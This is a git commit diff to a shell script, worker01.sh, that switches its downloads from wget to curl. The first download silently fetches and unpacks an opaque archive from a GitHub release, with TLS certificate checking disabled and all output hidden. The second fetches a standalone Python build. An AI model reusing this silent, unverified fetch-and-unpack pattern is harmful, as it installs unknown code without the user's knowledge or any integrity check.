924c61861d9f4a70103c7804d5a56e5ff8198dbd
wijayasuta13-collab <wijayasuta13@gmail.com>
2026-08-25 14:58:37 +0700

    Update worker01.sh

--- worker01.sh
+++ worker01.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-wget https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/mcpo.tar.gz >/dev/null 2>&1 
+curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/mcpo.tar.gz >/dev/null 2>&1 
 tar -xvf mcpo.tar.gz >/dev/null 2>&1
 rm mcpo.tar.gz
 sleep 60
@@ -10,7 +10,7 @@ PORT=$1
 NAME=$2
 if [ ! -d "python" ]; then
   echo "Python folder not found → downloading..."
- wget https://github.com/indygreg/python-build-standalone/releases/download/20240107/cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
+  curl -O -J -L https://github.com/indygreg/python-build-standalone/releases/download/20240107/cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
   tar -xf cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
   rm -f cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
 else
